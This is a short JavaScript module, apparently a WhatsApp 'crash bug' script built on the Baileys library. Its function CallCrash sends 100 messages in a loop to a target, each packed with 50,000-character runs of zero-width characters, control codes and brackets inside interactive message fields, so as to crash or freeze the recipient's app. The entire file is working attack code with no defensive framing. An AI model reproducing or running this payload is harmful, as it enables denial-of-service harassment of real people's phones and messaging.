
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');



async function CallCrash(SYxS7, target) {

    const N = 50000;

    for (let i = 0; i < 100; i++) {
      const nanX = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                bloksWidget: {
                  fallback: "\u200D".repeat(N),
                  type:     "\u200F".repeat(N),
                  data:     "[".repeat(N),
                  uuid:     "\u200B".repeat(N),
                },
                subtitle: "\u0010".repeat(N),
                title:    "X".repeat(N),
              },
              nativeFlowMessage: { buttons: [{}] },
              body: { text: "\u000F" },
            },
          },
        },
      };

      const msg = generateWAMessageFromContent(target, nanX, {});

      await SYxS7.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        noSelfSync: true,
      });
    }
}

module.exports = { CallCrash }
